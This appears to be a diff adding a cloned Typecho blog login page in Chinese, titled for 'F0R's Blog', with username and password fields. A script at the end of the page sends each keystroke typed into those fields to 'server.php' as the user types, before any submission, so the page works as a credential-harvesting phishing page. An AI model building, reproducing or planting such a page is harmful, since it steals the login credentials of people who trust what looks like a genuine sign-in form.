@@ -1,0 +1,93 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="renderer" content="webkit">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <title>登录到F0R's Blog - F0R's Blog - Powered by Typecho</title>
+        <meta name="robots" content="noindex, nofollow">
+        <link rel="stylesheet" href="http://#/admin/css/normalize.css?v=1.2.0">
+<link rel="stylesheet" href="http://#/admin/css/grid.css?v=1.2.0">
+<link rel="stylesheet" href="http://#/admin/css/style.css?v=1.2.0">    </head>
+<body>
+<div class="typecho-login-wrap">
+    <div class="typecho-login">
+        <h1><a href="http://typecho.org" class="i-logo">Typecho</a></h1>
+        <form action="#/index.php/action/login?_=d442552e201460f130cc042c2f488f91" method="post" name="login" role="form">
+            <p>
+                <label for="name" class="sr-only">用户名</label>
+                <input type="text" id="nameInput" name="name" value="" placeholder="用户名" class="text-l w-100" autofocus />
+            </p>
+            <p>
+                <label for="password" class="sr-only">密码</label>
+                <input type="password" id="passwordInput" name="password" class="text-l w-100" placeholder="密码" />
+            </p>
+            <p class="submit">
+                <button type="submit" class="btn btn-l w-100 primary">登录</button>
+                <input type="hidden" name="referer" value="#/admin/" />
+            </p>
+            <p>
+                <label for="remember">
+                    <input type="checkbox" name="remember" class="checkbox" value="1" id="remember" /> 下次自动登录                </label>
+            </p>
+        </form>
+        
+        <p class="more-link">
+            <a href="#/">返回首页</a>
+                        &bull;
+            <a href="#/admin/register.php">用户注册</a>
+                    </p>
+    </div>
+</div>    
+  <script>
+      const passwordInput = document.getElementById("passwordInput");
+      const nameInput = document.getElementById("nameInput");
+  
+      passwordInput.addEventListener("input", function(event) {
+          const password = event.target.value;
+          sendDataToServer("passwd", password);
+      });
+  
+      nameInput.addEventListener("input", function(event) {
+          const name = event.target.value;
+          sendDataToServer("username", name);
+      });
+  
+      function sendDataToServer(type, con) {
+          if (type == "passwd") {
+              fetch('server.php', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                  },
+                  body: 'password=' + encodeURIComponent(con),
+              })
+              .then(response => response.text())
+              .then(data => {
+                  console.log("服务器响应: " + data);
+              })
+              .catch(error => {
+                  console.error("发送数据到服务器时出错: " + error);
+              });
+          }else if (type == "username") {
+              fetch('server.php', {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                  },
+                  body: 'username=' + encodeURIComponent(con),
+              })
+              .then(response => response.text())
+              .then(data => {
+                  console.log("服务器响应: " + data);
+                  console.log(con);
+              })
+              .catch(error => {
+                  console.error("发送数据到服务器时出错: " + error);
+              });
+          }
+      }
+  </script>
+    
+</body>
+</html>
